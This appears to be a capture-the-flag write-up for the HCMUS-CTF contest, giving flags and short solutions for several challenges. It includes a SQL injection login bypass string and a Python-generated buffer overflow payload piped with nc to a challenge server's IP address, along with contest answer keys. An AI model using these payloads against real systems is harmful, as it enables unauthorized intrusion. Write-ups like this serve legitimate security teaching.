# HCMUS-CTF
## Discord
- Go to https://discord.com/channels/714108446370299925/717326910908137482 the you see:
- Flag for discord: HCMUS-CTF{089 111 085 095 107 110 060 062 119 095 100 105 115 099 111 114 068 095 064 110 100 095 085 095 075 110 048 119 095 065 083 067 073 073}
- This ascii of characters. Decode:
- Flag is: HCMUS-CTF{YoU_kn<>w_discorD_@nd_U_Kn0w_ASCII}
## Baby SQL
- Challenges at: http://159.65.13.76:1339/ 
- This is basic SQL injection. Username: admin. Pass:'or '1'='1.
- The flag is: HCMUS-CTF{Sh0uld_N0tz_Conc4ten4te_S+r1ng_SQQLLL}
## TellMe
- Open file tellme.c
- You will see this code:
<pre><code>
	if(userid == 0x3211 && !strcmp("sUpErPassHCMUS\n", passwd)){
		printf("Wellcome back! Aministrator ^_^\n");
		fflush(stdout);
		fflush(stdin);
		system("/bin/cat flag");
		exit(0);	
	}
</code></pre>
- UserID: 12817
- Password: sUpErPassHCMUS
- Flag is: HCMUS-CTF{Ohhh~Just_give_me_the_credential!!Nah}
## StackString
- Decompiler stackstring with Ghidra Tool:
- In function main you will see:
- ![alt text](https://github.com/1712249/HCMUS-CTF/blob/master/stackstring.png)
- Hexdecode you get:
- local_50:}3
- local_70:_Kc4tS{F
- local_68:G_gn1rtS
- local_58:uq1nhcet
- local_78:TC-SUMCH
- local_60:_dlo_D00
- Flag is: HCMUS-CTF{St4cK_Str1ng_G00D_old_techn1qu3}
## Patient
- Auto Click 500 times.
- Flag is: HCMUS-CTF{WOW_yOu_are_p4tient}.
## PatientRevenge
- Auto Click 100000 times.
- Flag is: HCMUS-CTF{I_hope_you_dont_click_by_hand}
## FlowMe
- Openfile flowme.c.
- You will see this code: 
<pre><code>
int secret_func(){
    system("/bin/cat flag.txt");
    return 0;
}

int authentication(char *password) {
    char password_buffer[256];
    strcpy(password_buffer, password);
    if(strcmp(password_buffer, "this_is_a_password") == 0)
        return 1;
    
    return 0;
}
</code></pre>
- I guess buffer overflow from function strcpy at authenticaiton to function secret_func.
- Use GDB and [Buffer overflow pattern generator](https://wiremask.eu/tools/buffer-overflow-pattern-generator/) this function is overflow at 256 and Adress secret_func is: 0x00000000004007ea 
- This is payload: 
<pre><code>
	echo $(python -c 'print "A" * 264 +"\xea\x07\x40\x00\x00\x00\x00\x00"') | nc 159.65.13.76 33103
</code></pre>
